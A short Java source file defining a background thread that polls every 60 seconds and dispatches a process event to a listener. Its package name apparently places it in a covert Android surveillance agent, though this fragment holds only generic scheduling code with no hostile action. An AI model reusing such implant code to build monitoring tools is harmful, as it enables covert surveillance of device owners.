package com.ht.RCSAndroidGUI.listener;

import com.ht.RCSAndroidGUI.Process;

public class BroadcastMonitorProcess extends Thread {
	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorProcess";

	private boolean stop;
	private int period;

	public BroadcastMonitorProcess() {
		stop = false;
		period = 60000; // Poll interval
	}

	synchronized public void run() {
		do {
			if (stop) {
				return;
			}

			onReceive(false);

			try {
				wait(period);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		} while (true);
	}

	public void onReceive(boolean isConnected) {
		ListenerProcess.self().dispatch(new Process());
	}

	void register() {
		stop = false;
	}

	synchronized void unregister() {
		stop = true;
		notify();
	}
}
